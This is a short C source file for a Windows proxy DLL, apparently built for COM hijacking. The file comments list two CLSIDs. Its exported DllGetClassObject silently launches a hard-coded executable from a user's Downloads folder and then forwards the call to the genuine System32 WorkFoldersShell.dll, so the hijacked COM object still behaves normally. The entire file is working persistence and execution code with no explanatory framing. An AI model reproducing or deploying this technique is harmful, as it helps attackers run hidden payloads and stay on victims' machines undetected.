//{10D62541-90D0-42FE-848C-0DBC1AC42EDA}
//{0358B920-0AC7-461F-98F4-58E32CD89148}


#include <Windows.h>
#include <combaseapi.h>


typedef HRESULT(WINAPI * tDllGetClassObject)(REFCLSID rclsid, REFIID riid, LPVOID* ppv);
tDllGetClassObject pDllGetClassObject;

HRESULT STDAPI DllGetClassObject(REFCLSID rclsid,
								 REFIID riid,
								 LPVOID FAR* ppv) {
	STARTUPINFO info={sizeof(info)};
	PROCESS_INFORMATION processInfo;
	HMODULE hOrigDLL;

	CreateProcess(
		"C:\\Users\\win10\\Downloads\\in.exe",
		"", NULL, NULL, TRUE, 0, NULL, NULL,
		&info, &processInfo);

	hOrigDLL = LoadLibrary("C:\\Windows\\System32\\WorkFoldersShell.dll");
	pDllGetClassObject = (tDllGetClassObject) GetProcAddress(hOrigDLL, "DllGetClassObject");
	if (!pDllGetClassObject)
		return S_FALSE;

	HRESULT hRes = pDllGetClassObject(rclsid, riid, ppv);

	return hRes;
								 }
